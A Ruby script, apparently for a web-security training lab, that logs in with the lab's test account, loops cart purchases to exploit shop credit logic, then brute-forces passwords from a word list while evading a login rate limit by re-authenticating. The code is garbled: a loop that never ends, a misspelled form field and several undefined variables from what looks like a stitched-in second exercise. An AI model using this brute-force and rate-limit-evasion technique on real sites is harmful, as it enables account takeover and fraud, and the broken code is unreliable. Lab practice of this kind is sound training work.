# frozen_string_literal: true

require 'uri'
require 'net/http'
require '../authentication/valid_login'

TARGET = 'https://0ae500d003189c05c0fc130f00bf0025.web-security-academy.net/'

uri = URI(TARGET)

def get_res(req:, uri:)
  Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
    http.request(req)
  end
end

# login
valid_login = ValidLogin.new(uri: URI("#{TARGET}/login"), username: 'wiener', password: 'peter', success_code: '302')
                        .login

session = valid_login['set-cookie']
credit = 100

while credit < 1337
  quantity = (credit / (0.70) / 10).to_i
  res = Net::HTTP.post(URI("#{TARGET}/cart"),
                       "productId=2&redit=CART&quantity=#{quantity}",
                       { 'Content-Type' => 'application/x-www-form-urlencoded',
                         'Cookie' => session })
  req = Net::HTTP::Get.new(URI("#{TARGET}/cart"))
  req['Cookie'] = session

  res = get_res(req: req, uri: URI("#{TARGET}/cart"))
end

File.readlines(PASSWORDS).each do |line|
  l = line.strip
  res = Net::HTTP.post_form(uri, username: CANDIDATE, password: l)
  puts "Tried #{CANDIDATE}:#{l}\tcode:#{res.code}"
  counter += 1

  if res.body.include?(
    '<p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>'
  )
    puts "Rate-Limited, sleeing for #{sleep_secs}"
    sleep 60
  end

  if counter >= 2
    valid_login.login
    counter = 0
  end

  next if res.code == '200'

  puts "#{CANDIDATE}:#{l}"
  break
end
